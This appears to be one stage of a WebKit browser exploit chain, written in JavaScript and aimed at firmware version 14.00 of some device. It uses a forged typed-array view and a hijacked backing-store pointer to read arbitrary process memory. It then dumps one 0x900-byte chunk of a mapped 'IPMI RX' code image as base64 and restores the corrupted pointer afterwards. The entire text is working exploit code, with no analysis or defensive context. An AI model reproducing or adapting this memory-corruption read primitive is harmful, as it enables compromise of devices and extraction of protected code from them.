// Dump one bounded 0x900-byte chunk of the mapped 14.00 IPMI RX
// image. At most 22 commands cover the 0xc000-byte region. Each command
// checks the same-session module fingerprint and restores the carrier.
var results;
var phase="preflight";
try {
  var state=window.__fw14ArrayState;
  var plan=window.__fw14NativePlan;
  var native=window.__fw14NativeInvoke;
  if (!state || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      !plan || !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      !native || state.array[0]!==state.a)
    throw new Error("current_page_plan_missing");
  var pid=native.call("getpid",[]);
  if (pid.value!==145 || pid.high!==0 ||
      plan.target<0x802454000 || plan.target>=0x8024a8000 ||
      plan.webkitBase<0x8054dc000 || plan.webkitBase>=0x808f74000)
    throw new Error("measured_session_identity_changed");
  var part=window.__fw14IpmiDumpPartV1;
  if (part===undefined) part=0;
  if (!Number.isInteger(part) || part<0 || part>21)
    throw new Error("dump_part_out_of_range");
  var forged=state.view;
  var carrier=state.ownedTypedView;
  if (carrier.length!==65536 || carrier[0]!==0x31 || carrier[7]!==0xa8)
    throw new Error("carrier_canary_changed");
  function bytesAt(index,count) {
    var bytes=[];
    for (var i=0;i<count;i++) bytes.push(forged[index+i]);
    return bytes;
  }
  function valueOf(bytes) {
    var value=0;
    for (var i=bytes.length-1;i>=0;i--) value=value*256+bytes[i];
    return value;
  }
  function pointerBytes(value) {
    var bytes=[];
    for (var i=0;i<8;i++)
      bytes.push(Math.floor(value/Math.pow(2,8*i))&255);
    return bytes;
  }
  var objectWord;
  try {
    state.array[0]=carrier;
    objectWord=valueOf(bytesAt(state.index,8));
  } finally {
    state.array[0]=state.a;
  }
  var slot=objectWord-state.calibratedViewBase+8;
  if (!Number.isSafeInteger(slot) || slot<0 || slot+8>=16777216)
    throw new Error("carrier_slot_outside_view");
  var original=bytesAt(slot,8);
  function same(a,b) {
    if (a.length!==b.length) return false;
    for (var i=0;i<a.length;i++) if (a[i]!==b[i]) return false;
    return true;
  }
  function readAt(address,count) {
    var pointer=pointerBytes(address);
    try {
      for (var i=0;i<8;i++) forged[slot+i]=pointer[i];
      var bytes=[];
      for (var j=0;j<count;j++) bytes.push(carrier[j]);
      return bytes;
    } finally {
      for (var k=0;k<8;k++) forged[slot+k]=original[k];
    }
  }
  function encodeRange(bytes,start,end) {
    var text="";
    for (var i=start;i<end;i++) text+=String.fromCharCode(bytes[i]);
    return btoa(text);
  }
  phase="mapped_code_read";
  if (api && typeof api.markSync==="function")
    api.markSync("ipmi_dump_preflight");
  var prefix=readAt(0x833f00000,8);
  if (!same(prefix,[85,72,137,229,65,87,65,86]))
    throw new Error("mapped_prefix_changed");
  var relativeOffset=part*0x900;
  var length=Math.min(0x900,0xc000-relativeOffset);
  var bytes=readAt(0x833f00000+relativeOffset,length);
  var restored=same(bytesAt(slot,8),original) &&
    carrier[0]===0x31 && carrier[7]===0xa8 &&
    state.array[0]===state.a &&
    Math.abs(Math.expm1(1)-1.718281828459045)<=1e-12;
  if (!restored) throw new Error("carrier_not_restored");
  var checks=[];
  for (var half=0;half<2;half++) {
    var start=half*1152;
    var details={offset:relativeOffset+start,restored:restored};
    for (var chunk=0;chunk<3;chunk++) {
      var at=start+chunk*384;
      details["b"+chunk]=at<length?
        encodeRange(bytes,at,Math.min(at+384,length)):"";
    }
    checks.push({id:half===0?"ipmi_dump_a_v1":
      "ipmi_dump_b_v1",status:"pass",details:details});
  }
  window.__fw14IpmiDumpPartV1=part+1;
  if (api && typeof api.markSync==="function")
    api.markSync("ipmi_dump_restored");
  results=checks;
} catch (error) {
  results=[{id:"ipmi_dump_a_v1",status:"error",
    details:{phase:phase,error:String(error).slice(0,180)}},
    {id:"ipmi_dump_b_v1",status:"error",
    details:{phase:phase,error:String(error).slice(0,180)}}];
}
return results;
